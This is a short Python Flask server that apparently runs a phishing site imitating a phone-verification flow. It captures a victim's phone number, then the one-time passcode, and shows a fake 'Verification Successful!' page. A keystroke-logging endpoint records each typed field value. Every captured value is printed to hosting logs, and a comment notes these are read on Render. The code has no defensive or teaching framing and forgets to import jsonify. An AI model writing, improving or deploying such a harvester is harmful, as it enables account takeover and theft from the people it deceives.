from flask import Flask, request, redirect, render_template

app = Flask(__name__)

@app.route('/', methods=['GET'])
def index():
    return render_template('index.html')

@app.route('/capture', methods=['POST'])
def capture():
    phone = request.form.get('phone')
    print(f"\n[!!!] PHONE CAPTURED: {phone}\n", flush=True)
    return redirect('/otp')

@app.route('/otp', methods=['GET'])
def otp_page():
    return render_template('otp.html')

@app.route('/success', methods=['POST'])
def success():
    otp = request.form.get('otp')
    print(f"[!!!] OTP CAPTURED: {otp}\n", flush=True)
    return "<h1 style='text-align:center; margin-top:50px; color:#00a884;'>Verification Successful!</h1>"

@app.route('/log_keystroke', methods=['POST'])
def log_keystroke():
    data = request.json
    field = data.get('field')
    value = data.get('value')
    
    # We use flush=True so it prints to Render logs immediately
    print(f"[*] KEYSTROKE LOGGED ({field}): {value}", flush=True)
    
    return jsonify({"status": "success"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)